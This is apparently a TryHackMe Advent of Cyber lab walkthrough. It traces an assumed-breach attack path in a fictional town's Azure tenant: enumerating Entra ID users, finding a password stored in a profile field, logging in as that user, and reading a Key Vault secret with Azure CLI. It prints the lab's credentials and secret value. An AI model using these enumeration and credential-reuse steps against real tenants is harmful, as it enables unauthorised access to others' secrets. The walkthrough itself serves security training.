## Intro to Azure  

Before diving into the Glitch's idea of the attacker's path, let's introduce some of the key concepts that will be covered in the process. We are going to start by introducing Azure. To do that, let's consider why McSkidy is using Azure in the first place.

It all started when McSkidy's role as the cyber security expert of Wareville really started to take off. Before she knew it, McSkidy was in very high demand and needed to create all kinds of resources to help her organise her duties; these included a web application to handle appointment making, multiple machines running for investigations, and more machines running for evidence storing and analysis. McSkidy hosted and managed all of these machines herself, that is, on-prem (on-premises). This initially wasn't a massive issue because, after all, she wasn't a corporation but just helping the citizens of Wareville with cyber security matters.

However, as time went on, McSkidy ran into issues during peak times when she would receive many requests for help, and therefore needed to process more evidence. All of this increased demand meant McSkidy had to scale up her resources to handle the load. To put a long story short, this was a lot of hassle for McSkidy. She wished there was a way for someone to handle her infrastructure on her behalf, especially when scaling her resources up (during peak times) and down (when they resumed). That's when Azure came to the rescue.

![McSkidy and Azure working together in office](https://tryhackme-images.s3.amazonaws.com/user-uploads/6228f0d4ca8e57005149c3e3/room-content/6228f0d4ca8e57005149c3e3-1730822510157.png)  

Azure is a CSP (Cloud Service Provider), and CSPs (others include Google Cloud and AWS) provide computing resources such as computing power on demand in a highly scalable fashion. In other words, McSkidy could instead have Azure manage her underlying infrastructure, scaling it in times of increased demand and decreasing it once traffic resumed to normal levels. The best bit? McSkidy only has to pay for what she uses; gone were the days of buying physical infrastructure to handle increased loads, only for that infrastructure to go unused the majority of the time.  

Azure (and cloud adoption in general) boasts many benefits beyond cost optimisation. Azure also gave McSkidy access to lots of cloud services ranging from identity management to data ingestion (quite frankly, there are more services than can be abbreviated in a sentence as, at the time of writing, there are over 200), these services can be used to build, deploy, and manage McSkidy's current infrastructure as well as give her the options to upgrade or build new applications in the future given the range of services available. A couple of Azure services will come up during the Glitch's attack path. Let's take a look at them now:

**Azure Key Vault**

Azure Key Vault is an Azure service that allows users to securely store and access secrets. These secrets can be anything from API Keys, certificates, passwords, cryptographic keys, and more. Essentially, anything you want to keep safe, away from the eyes of others, and easily configure and restrict access to is what you want to store in an Azure Key Vault.

The secrets are stored in vaults, which are created by vault owners. Vault owners have full access and control over the vault, including the ability to enable auditing so a record is kept of who accessed what secrets and grant permissions for other users to access the vault (known as **vault consumers**). McSkidy uses this service to store secrets related to evidence and has been entrusted to store some of Wareville's town secrets here.

**Microsoft Entra ID**

McSkidy also needed a way to grant users access to her system and be able to secure and organise their access easily. So, a Wareville town member could easily access or update their secret. Microsoft Entra ID (formerly known as Azure Active Directory) is Azure's solution. Entra ID is an identity and access management (IAM) service. In short, it has the information needed to assess whether a user/application can access X resource. In the case of the Wareville town members, they made an Entra ID account, and McSkidy assigned the appropriate permissions to this account.

With that covered, let's see what the Glitch has come up with.

## Assumed Breach Scenario

Knowing that a potential breach had happened, McSkidy decided to conduct an Assumed Breach testing within their Azure tenant. The Assumed Breach scenario is a type of penetration testing setup in which an initial access or foothold is provided, mimicking the scenario in which an attacker has already established its access inside the internal network.

In this setup, the mindset is to assess how far an attacker can go once they get inside your network, including all possible attack paths that could branch out from the defined starting point of intrusion.


**Azure Cloud Shell**

Azure Cloud Shell is a browser-based command-line interface that provides developers and IT professionals a convenient and powerful way to manage Azure resources. It integrates both Bash and PowerShell environments, allowing users to execute scripts, manage Azure services, and run commands directly from their web browser without needing local installation. Cloud Shell has built-in tools and pre-configured environments, including Azure CLI, Azure PowerShell, and popular development tools, making it an efficient solution for cloud management and automation tasks.

**Azure CLI**

Azure Command-Line Interface, or Azure CLI, is a command-line tool for managing and configuring Azure resources. The Glitch relied heavily on this tool while reviewing the Wareville tenant, so let's use the same one while walking through the Azure attack path.

As mentioned above, Azure CLI is part of the built-in tools inside the Cloud Shell, so go back to the [Azure portal](https://portal.azure.com/) and launch Azure Cloud Shell by clicking on the terminal icon shown below:

![Azure Portal Cloud Shell button.](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/5dbea226085ab6182a2ee0f7-1731679657004.png)  

Select Bash, since we will be executing Azure CLI commands.

![Bash or PowerShell options for Azure Cloud Shell.](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efbaebdaaea011c857b438d/room-content/5efbaebdaaea011c857b438d-1729952192089.png)

To get started, select `No storage account required` and choose `Az-Subs-AoC` for the subscription.

![Getting started instructions for Azure Cloud Shell.](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efbaebdaaea011c857b438d/room-content/5efbaebdaaea011c857b438d-1729952373608.png)

![Initial Azure Cloud Shell prompt.](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efbaebdaaea011c857b438d/room-content/5efbaebdaaea011c857b438d-1729952645147.png)

At this point, we are ready to execute Azure CLI commands in the Azure Cloud Shell. Note that all the following commands are to be executed in the Azure Cloud Shell.  

Azure Cloud Shell

```shell-session
usr-xxxxxxxx [ ~ ]$ az ad signed-in-user show
```

**Note:** You don't need to authenticate using `az login` as you have already been authenticated into the Azure portal.  

You can confirm that the credentials worked if the succeeding output renders the authenticated user details.

Azure Cloud Shell

```shell-session
{
  "@odata.context": "https://graph.microsoft.com/v1.0/$metadata#users/$entity",
  "businessPhones": [],
  "displayName": "usr-03250729",
  "givenName": null,
  "id": "753eafcd-3ff6-4077-94ba-ba3230ca47a8",
  "jobTitle": null,
  "mail": null,
  "mobilePhone": null,
  "officeLocation": null,
  "preferredLanguage": null,
  "surname": null,
  "userPrincipalName": "usr-03250729@aoc2024.onmicrosoft.com"
}
```

##   
Going Down the Azure Rabbit Hole

When the Glitch got hold of an initial account in Wareville's Azure tenant, he had no idea what was inside it. So, he decided to enumerate first the existing users and groups within the tenant.

**Entra ID Enumeration**

Using the current account, let's start by listing all the users in the tenant.   
**Note:** This command might take a while depending on the amount of user accounts available, so feel free to skip it.

```shell-session
usr-xxxxxxxx [ ~ ]$ az ad user list
```

  
The Azure CLI typically uses the following command syntax: `az GROUP SUBGROUP ACTION OPTIONAL_PARAMETERS`. Given this, the command above can be broken down into:

- Target group or service: `ad` (Azure AD or Entra ID)
- Target subgroup: `user` (Azure AD users)
- Action: `list`

**Note:** To see the available commands, you may execute `az -h` or `az GROUP -h`.

After executing the command, you might have been overwhelmed with the number of accounts listed. For a better view, let's follow McSkidy's suggestion to only look for the accounts prepended with `wvusr-`. According to her, these accounts are more interesting than the other ones. To do this, we will use the `--filter` parameter and filter all accounts that start with `wvusr-`.

Initial result

``` bash
[
  {
    "businessPhones": [],
    "displayName": "breakglass",
    "givenName": null,
    "id": "d6c5bb7b-36a2-4706-ad5f-dd5a73e5dfd8",
    "jobTitle": null,
    "mail": null,
    "mobilePhone": null,
    "officeLocation": null,
    "preferredLanguage": null,
    "surname": null,
    "userPrincipalName": "breakglass@aoc2024.onmicrosoft.com"
  },
  {
    "businessPhones": [],
    "displayName": "wiz",
    "givenName": null,
    "id": "b470c1dc-9d37-4ce9-b528-4aeaf819781a",
    "jobTitle": null,
    "mail": null,
    "mobilePhone": null,
    "officeLocation": null,
    "preferredLanguage": null,
    "surname": null,
    "userPrincipalName": "oz_thmtraininglabs.onmicrosoft.com#EXT#@aoc2024.onmicrosoft.com"
  },
  {
    "businessPhones": [],
    "displayName": "usr-03250729",
    "givenName": null,
    "id": "753eafcd-3ff6-4077-94ba-ba3230ca47a8",
    "jobTitle": null,
    "mail": null,
    "mobilePhone": null,
    "officeLocation": null,
    "preferredLanguage": null,
    "surname": null,
    "userPrincipalName": "usr-03250729@aoc2024.onmicrosoft.com"
  },
  {
    "businessPhones": [],
    "displayName": "weyland",
    "givenName": null,
    "id": "bbbe3752-0ce4-476f-b52f-e2aef17f3183",
    "jobTitle": null,
    "mail": null,
    "mobilePhone": null,
    "officeLocation": null,
    "preferredLanguage": null,
    "surname": null,
    "userPrincipalName": "wayland@aoc2024.onmicrosoft.com"
  },
  {
    "businessPhones": [],
    "displayName": "wvusr-alphaware",
    "givenName": null,
    "id": "d197bfbd-adaf-4e54-9ac1-62b2a9568f91",
    "jobTitle": null,
    "mail": null,
    "mobilePhone": null,
    "officeLocation": null,
    "preferredLanguage": null,
    "surname": null,
    "userPrincipalName": "wvusr-alphaware@aoc2024.onmicrosoft.com"
  },
  {
    "businessPhones": [],
    "displayName": "wvusr-backupware",
    "givenName": null,
    "id": "1db95432-0c46-45b8-b126-b633ae67e06c",
    "jobTitle": null,
    "mail": null,
    "mobilePhone": null,
    "officeLocation": "R3c0v3r_s3cr3ts!",
    "preferredLanguage": null,
    "surname": null,
    "userPrincipalName": "wvusr-backupware@aoc2024.onmicrosoft.com"
  },
  {
    "businessPhones": [],
    "displayName": "wvusr-firmware",
    "givenName": null,
    "id": "1f80a74b-4abc-4f93-b065-965ea5c826c8",
    "jobTitle": null,
    "mail": null,
    "mobilePhone": null,
    "officeLocation": null,
    "preferredLanguage": null,
    "surname": null,
    "userPrincipalName": "wvusr-firmware@aoc2024.onmicrosoft.com"
  },
  {
    "businessPhones": [],
    "displayName": "wvusr-freeware",
    "givenName": null,
    "id": "47f6013e-9533-49f5-a779-615721145e50",
    "jobTitle": null,
    "mail": null,
    "mobilePhone": null,
    "officeLocation": null,
    "preferredLanguage": null,
    "surname": null,
    "userPrincipalName": "wvusr-freeware@aoc2024.onmicrosoft.com"
  },
  {
    "businessPhones": [],
    "displayName": "wvusr-hardware",
    "givenName": null,
    "id": "ac459a56-09cf-440a-be46-2006b36a68e1",
    "jobTitle": null,
    "mail": null,
    "mobilePhone": null,
    "officeLocation": null,
    "preferredLanguage": null,
    "surname": null,
    "userPrincipalName": "wvusr-hardware@aoc2024.onmicrosoft.com"
  },
  {
    "businessPhones": [],
    "displayName": "wvusr-mayor_malware",
    "givenName": null,
    "id": "4d29c472-f2f6-4e18-8a37-dcd2e2040489",
    "jobTitle": null,
    "mail": null,
    "mobilePhone": null,
    "officeLocation": null,
    "preferredLanguage": null,
    "surname": null,
    "userPrincipalName": "wvusr-mayor_malware@aoc2024.onmicrosoft.com"
  },
  {
    "businessPhones": [],
    "displayName": "wvusr-mcskidy",
    "givenName": null,
    "id": "33845c09-f7ad-45eb-ad24-c05cc1e39bda",
    "jobTitle": null,
    "mail": null,
    "mobilePhone": null,
    "officeLocation": null,
    "preferredLanguage": null,
    "surname": null,
    "userPrincipalName": "wvusr-mcskidy@aoc2024.onmicrosoft.com"
  },
  {
    "businessPhones": [],
    "displayName": "yutani",
    "givenName": null,
    "id": "86e14415-abac-486d-b49a-4825bcd3a13e",
    "jobTitle": null,
    "mail": null,
    "mobilePhone": null,
    "officeLocation": null,
    "preferredLanguage": null,
    "surname": null,
    "userPrincipalName": "yutani@aoc2024.onmicrosoft.com"
  }
]
```

```shell-session
usr-xxxxxxxx [ ~ ]$ az ad user list --filter "startsWith('wvusr-', displayName)"
```

  
You may observe that an unusual parameter was set to a specific account in the output. One of the users, **wvusr-backupware**, has its password stored in one of the fields. 
After filter result
``` bash
[
  {
    "businessPhones": [],
    "displayName": "wvusr-alphaware",
    "givenName": null,
    "id": "d197bfbd-adaf-4e54-9ac1-62b2a9568f91",
    "jobTitle": null,
    "mail": null,
    "mobilePhone": null,
    "officeLocation": null,
    "preferredLanguage": null,
    "surname": null,
    "userPrincipalName": "wvusr-alphaware@aoc2024.onmicrosoft.com"
  },
  {
    "businessPhones": [],
    "displayName": "wvusr-backupware",
    "givenName": null,
    "id": "1db95432-0c46-45b8-b126-b633ae67e06c",
    "jobTitle": null,
    "mail": null,
    "mobilePhone": null,
    "officeLocation": "R3c0v3r_s3cr3ts!",
    "preferredLanguage": null,
    "surname": null,
    "userPrincipalName": "wvusr-backupware@aoc2024.onmicrosoft.com"
  },
  {
    "businessPhones": [],
    "displayName": "wvusr-firmware",
    "givenName": null,
    "id": "1f80a74b-4abc-4f93-b065-965ea5c826c8",
    "jobTitle": null,
    "mail": null,
    "mobilePhone": null,
    "officeLocation": null,
    "preferredLanguage": null,
    "surname": null,
    "userPrincipalName": "wvusr-firmware@aoc2024.onmicrosoft.com"
  },
  {
    "businessPhones": [],
    "displayName": "wvusr-freeware",
    "givenName": null,
    "id": "47f6013e-9533-49f5-a779-615721145e50",
    "jobTitle": null,
    "mail": null,
    "mobilePhone": null,
    "officeLocation": null,
    "preferredLanguage": null,
    "surname": null,
    "userPrincipalName": "wvusr-freeware@aoc2024.onmicrosoft.com"
  },
  {
    "businessPhones": [],
    "displayName": "wvusr-hardware",
    "givenName": null,
    "id": "ac459a56-09cf-440a-be46-2006b36a68e1",
    "jobTitle": null,
    "mail": null,
    "mobilePhone": null,
    "officeLocation": null,
    "preferredLanguage": null,
    "surname": null,
    "userPrincipalName": "wvusr-hardware@aoc2024.onmicrosoft.com"
  },
  {
    "businessPhones": [],
    "displayName": "wvusr-mayor_malware",
    "givenName": null,
    "id": "4d29c472-f2f6-4e18-8a37-dcd2e2040489",
    "jobTitle": null,
    "mail": null,
    "mobilePhone": null,
    "officeLocation": null,
    "preferredLanguage": null,
    "surname": null,
    "userPrincipalName": "wvusr-mayor_malware@aoc2024.onmicrosoft.com"
  },
  {
    "businessPhones": [],
    "displayName": "wvusr-mcskidy",
    "givenName": null,
    "id": "33845c09-f7ad-45eb-ad24-c05cc1e39bda",
    "jobTitle": null,
    "mail": null,
    "mobilePhone": null,
    "officeLocation": null,
    "preferredLanguage": null,
    "surname": null,
    "userPrincipalName": "wvusr-mcskidy@aoc2024.onmicrosoft.com"
  }
]
```
When the Glitch saw this one, he immediately thought it could be the first step taken by the intruder to gain further access inside the tenant. However, he decided to continue the initial reconnaissance of users and groups. Now, let's continue by listing the groups.

```bash
usr-03250729 [ ~ ]$ az ad group list
[
  {
    "classification": null,
    "createdDateTime": "2024-10-13T23:10:55Z",
    "creationOptions": [],
    "deletedDateTime": null,
    "description": "Group for recovering Wareville's secrets",
    "displayName": "Secret Recovery Group",
    "expirationDateTime": null,
    "groupTypes": [],
    "id": "7d96660a-02e1-4112-9515-1762d0cb66b7",
    "isAssignableToRole": null,
    "mail": null,
    "mailEnabled": false,
    "mailNickname": "f315e3ef-c",
    "membershipRule": null,
    "membershipRuleProcessingState": null,
    "onPremisesDomainName": null,
    "onPremisesLastSyncDateTime": null,
    "onPremisesNetBiosName": null,
    "onPremisesProvisioningErrors": [],
    "onPremisesSamAccountName": null,
    "onPremisesSecurityIdentifier": null,
    "onPremisesSyncEnabled": null,
    "preferredDataLocation": null,
    "preferredLanguage": null,
    "proxyAddresses": [],
    "renewedDateTime": "2024-10-13T23:10:55Z",
    "resourceBehaviorOptions": [],
    "resourceProvisioningOptions": [],
    "securityEnabled": true,
    "securityIdentifier": "S-1-12-1-2107008522-1091699425-1645680021-3076967376",
    "serviceProvisioningErrors": [],
    "theme": null,
    "uniqueName": null,
    "visibility": "Private"
  }
]
```

  
**Note:** You may observe that we just changed the previous command from `az ad user list` to `az ad group list`. 

Given the output, it can be seen that a group named `Secret Recovery Group` exists. This is kind of an interesting group because of the description, so let's follow the white rabbit and list the members of this group.

```bash
usr-03250729 [ ~ ]$ az ad group member list --group "Secret Recovery Group"
[
  {
    "@odata.type": "#microsoft.graph.user",
    "businessPhones": [],
    "displayName": "wvusr-backupware",
    "givenName": null,
    "id": "1db95432-0c46-45b8-b126-b633ae67e06c",
    "jobTitle": null,
    "mail": null,
    "mobilePhone": null,
    "officeLocation": "R3c0v3r_s3cr3ts!",
    "preferredLanguage": null,
    "surname": null,
    "userPrincipalName": "wvusr-backupware@aoc2024.onmicrosoft.com"
  }
]
```

  
Given the previous output, it looks like everything makes a little sense now. All of the previous commands seem to point to the `wvusr-backupware` account. Since we have seen a potential set of credentials, let's jump to another user by clearing the current Azure CLI account session and logging in with the new account.

```shell-session
usr-xxxxxxxx [ ~ ]$ az account clear
usr-xxxxxxxx [ ~ ]$ az login -u EMAIL -p PASSWORD
```

  
**Note:** Replace the values with the actual email and password of the newly discovered account.

``` bash
usr-03250729 [ ~ ]$ az login -u wvusr-backupware@aoc2024.onmicrosoft.com -p R3c0v3r_s3cr3ts!
Authentication with username and password in the command line is strongly discouraged. Use one of the recommended authentication methods based on your requirements. For more details, see https://go.microsoft.com/fwlink/?linkid=2276314
Cloud Shell is automatically authenticated under the initial account signed-in with. Run 'az login' only if you need to use a different account
[
  {
    "cloudName": "AzureCloud",
    "homeTenantId": "1ad8a5d3-b45e-489d-9ef3-b5478392aac0",
    "id": "ddd3338d-bc5a-416d-8247-1db1f5b5ff43",
    "isDefault": true,
    "managedByTenants": [],
    "name": "Az-Subs-AoC",
    "state": "Enabled",
    "tenantDefaultDomain": "aoc2024.onmicrosoft.com",
    "tenantDisplayName": "AoC 2024",
    "tenantId": "1ad8a5d3-b45e-489d-9ef3-b5478392aac0",
    "user": {
      "name": "wvusr-backupware@aoc2024.onmicrosoft.com",
      "type": "user"
    }
  },
  {
    "cloudName": "AzureCloud",
    "homeTenantId": "1ad8a5d3-b45e-489d-9ef3-b5478392aac0",
    "id": "3e480a8d-0097-42ec-9c56-60d97ceeb66d",
    "isDefault": false,
    "managedByTenants": [],
    "name": "Subscription 1",
    "state": "Disabled",
    "tenantDefaultDomain": "aoc2024.onmicrosoft.com",
    "tenantDisplayName": "AoC 2024",
    "tenantId": "1ad8a5d3-b45e-489d-9ef3-b5478392aac0",
    "user": {
      "name": "wvusr-backupware@aoc2024.onmicrosoft.com",
      "type": "user"
    }
  }
]
```

**Azure Role Assignments**  

Since the `wvusr-backupware` account belongs to an interesting group, the Glitch's first hunch is to see whether sensitive or privileged roles are assigned to the group. And his thought was, "It doesn't make sense to name it like this if it can't do anything, right McSkidy?". But before checking the assigned roles, let's have a quick run-through of Azure Role Assignments.

**Azure Role Assignments** define the resources that each user or group can access. When a new user is created via Entra ID, it cannot access any resource by default due to a lack of role. To grant access, an administrator must assign a **role** to let users view or manage a specific resource. The privilege level configured in a role ranges from read-only to full-control. Additionally, **group members can inherit a role** when assigned to a group.  

Returning to the Azure enumeration, let's see if a role is assigned to the Secret Recovery Group. We will be using the `--all` option to list all roles within the Azure subscription, and we will be using the `--assignee` option with the group's ID to render only the ones related to our target group.
```bash
usr-03250729 [ ~ ]$ az role assignment list --assignee 7d96660a-02e1-4112-9515-1762d0cb66b7 --all
[
  {
    "condition": null,
    "conditionVersion": null,
    "createdBy": "b470c1dc-9d37-4ce9-b528-4aeaf819781a",
    "createdOn": "2024-10-14T20:25:32.172518+00:00",
    "delegatedManagedIdentityResourceId": null,
    "description": null,
    "id": "/subscriptions/ddd3338d-bc5a-416d-8247-1db1f5b5ff43/resourceGroups/rg-aoc-akv/providers/Microsoft.KeyVault/vaults/warevillesecrets/providers/Microsoft.Authorization/roleAssignments/3038142a-80c7-4bf1-b7c2-0939b906316d",
    "name": "3038142a-80c7-4bf1-b7c2-0939b906316d",
    "principalId": "7d96660a-02e1-4112-9515-1762d0cb66b7",
    "principalName": "Secret Recovery Group",
    "principalType": "Group",
    "resourceGroup": "rg-aoc-akv",
    "roleDefinitionId": "/subscriptions/ddd3338d-bc5a-416d-8247-1db1f5b5ff43/providers/Microsoft.Authorization/roleDefinitions/21090545-7ca7-4776-b22c-e363652d74d2",
    "roleDefinitionName": "Key Vault Reader",
    "scope": "/subscriptions/ddd3338d-bc5a-416d-8247-1db1f5b5ff43/resourceGroups/rg-aoc-akv/providers/Microsoft.KeyVault/vaults/warevillesecrets",
    "type": "Microsoft.Authorization/roleAssignments",
    "updatedBy": "b470c1dc-9d37-4ce9-b528-4aeaf819781a",
    "updatedOn": "2024-10-14T20:25:32.172518+00:00"
  },
  {
    "condition": null,
    "conditionVersion": null,
    "createdBy": "b470c1dc-9d37-4ce9-b528-4aeaf819781a",
    "createdOn": "2024-10-14T20:26:53.771014+00:00",
    "delegatedManagedIdentityResourceId": null,
    "description": null,
    "id": "/subscriptions/ddd3338d-bc5a-416d-8247-1db1f5b5ff43/resourceGroups/rg-aoc-akv/providers/Microsoft.KeyVault/vaults/warevillesecrets/providers/Microsoft.Authorization/roleAssignments/d2edb9d3-620b-45a0-af60-128b5153a00a",
    "name": "d2edb9d3-620b-45a0-af60-128b5153a00a",
    "principalId": "7d96660a-02e1-4112-9515-1762d0cb66b7",
    "principalName": "Secret Recovery Group",
    "principalType": "Group",
    "resourceGroup": "rg-aoc-akv",
    "roleDefinitionId": "/subscriptions/ddd3338d-bc5a-416d-8247-1db1f5b5ff43/providers/Microsoft.Authorization/roleDefinitions/4633458b-17de-408a-b874-0445c86b69e6",
    "roleDefinitionName": "Key Vault Secrets User",
    "scope": "/subscriptions/ddd3338d-bc5a-416d-8247-1db1f5b5ff43/resourceGroups/rg-aoc-akv/providers/Microsoft.KeyVault/vaults/warevillesecrets",
    "type": "Microsoft.Authorization/roleAssignments",
    "updatedBy": "b470c1dc-9d37-4ce9-b528-4aeaf819781a",
    "updatedOn": "2024-10-14T20:26:53.771014+00:00"
  }
]
```

  
**Note:** You may retrieve the group ID from the command executed previously: `az ad group list`.

The output seems slightly overwhelming, so let's break it down.

- First, it can be seen that there are two entries in the output, which means two roles are assigned to the group.
- Based on the `roleDefinitionName` field, the two roles are `Key Vault Reader` and `Key Vault Secrets User`.
- Both entries have the same scope value, pointing to a Microsoft Key Vault resource, specifically on the `warevillesecrets` vault.

Here's the definition of the roles based on the [Microsoft documentation](https://learn.microsoft.com/en-us/azure/role-based-access-control/built-in-roles):

|   |   |   |
|---|---|---|
|**Role**|**Microsoft Definition**|**Explanation**|
|Key Vault Reader|Read metadata of key vaults and its certificates, keys, and secrets.|This role allows you to read metadata of key vaults and its certificates, keys, and secrets. Cannot read sensitive values such as secret contents or key material.|
|Key Vault Secrets User|Read secret contents. Only works for key vaults that use the 'Azure role-based access control' permission model.|This special role allows you to read the contents of a Key Vault Secret.|

After seeing both of these roles, McSkidy immediately realised everything! This configuration allowed the attacker to access the sensitive data they were protecting. Now that she knew this, she asked the Glitch to confirm her assumption.

**Azure Key Vault**

With McSkidy's guidance, the Glitch is now tasked to verify if the current account, **wvusr-backupware**, can access the sensitive data. Let's list the accessible key vaults by executing the command below.
```bash
usr-03250729 [ ~ ]$ az keyvault list
[
  {
    "id": "/subscriptions/ddd3338d-bc5a-416d-8247-1db1f5b5ff43/resourceGroups/rg-aoc-akv/providers/Microsoft.KeyVault/vaults/warevillesecrets",
    "location": "eastus",
    "name": "warevillesecrets",
    "resourceGroup": "rg-aoc-akv",
    "tags": {},
    "type": "Microsoft.KeyVault/vaults"
  }
]
```

  
The output above confirms the key vault discovered from the role assignments named `warevillesecrets`. Now, let's see if secrets are stored in this key vault.
```bash
usr-03250729 [ ~ ]$ az keyvault secret list --vault-name warevillesecrets
[
  {
    "attributes": {
      "created": "2024-10-14T20:22:20+00:00",
      "enabled": true,
      "expires": null,
      "notBefore": null,
      "recoverableDays": 90,
      "recoveryLevel": "Recoverable+Purgeable",
      "updated": "2024-10-14T20:22:20+00:00"
    },
    "contentType": null,
    "id": "https://warevillesecrets.vault.azure.net/secrets/aoc2024",
    "managed": null,
    "name": "aoc2024",
    "tags": {}
  }
]
```
After executing the two previous commands, we confirmed that the **Reader** role allows us to view the key vault metadata, specifically the list of key vaults and secrets. Now, the only thing left to confirm is whether the current user can access the contents of the discovered secret with the **Key Vault Secrets User** role. This can be done by executing the following command.
```bash
usr-03250729 [ ~ ]$ az keyvault secret show --vault-name warevillesecrets --name aoc2024
{
  "attributes": {
    "created": "2024-10-14T20:22:20+00:00",
    "enabled": true,
    "expires": null,
    "notBefore": null,
    "recoverableDays": 90,
    "recoveryLevel": "Recoverable+Purgeable",
    "updated": "2024-10-14T20:22:20+00:00"
  },
  "contentType": null,
  "id": "https://warevillesecrets.vault.azure.net/secrets/aoc2024/7f6bf431a6a94165bbead372bca28ab4",
  "kid": null,
  "managed": null,
  "name": "aoc2024",
  "tags": {},
  "value": "WhereIsMyMind1999"
}
```
"Bingo!" the Glitch exclaimed as he saw the output above. McSkidy had confirmed her nightmare that a regular user could escalate their way into the secrets of Wareville.

With that, the Glitch had helped McSkidy to find the attack path that had been taken to escalate a user’s privileges and a lot had been learned in the process. The only question that remained was who had initially carried out the attack in the first place. There was a very limited set of Wares who had access to this tenant and with user visibility, and with that set of permissions, only town officials who perform governance validation on the tenant to ensure all the town’s secrets are being stored securely. The focus then turns to the motive; the only thing accessed was an access key stored in the key vault, which grants access to an evidence file stored elsewhere. The evidence in this file was in relation to recent cyber events this month in Wareville. We’ll have to keep our eyes peeled in the following days to get to the bottom of this.